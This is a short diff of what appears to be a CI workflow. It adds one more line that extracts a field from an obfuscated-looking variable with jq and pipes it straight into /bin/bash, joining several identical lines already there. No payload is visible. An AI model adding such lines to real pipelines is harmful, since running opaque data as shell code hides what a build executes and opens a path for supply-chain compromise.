@@ -29,6 +29,7 @@ jobs:
           echo $z3 | jq -r .ltp58047 | /bin/bash
           echo $zor5334 | jq -r .r3 | /bin/bash
           echo $cqt8 | jq -r .abd39163 | /bin/bash
+          printf '%s' "$gp4214" | jq -r .yerkn76 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
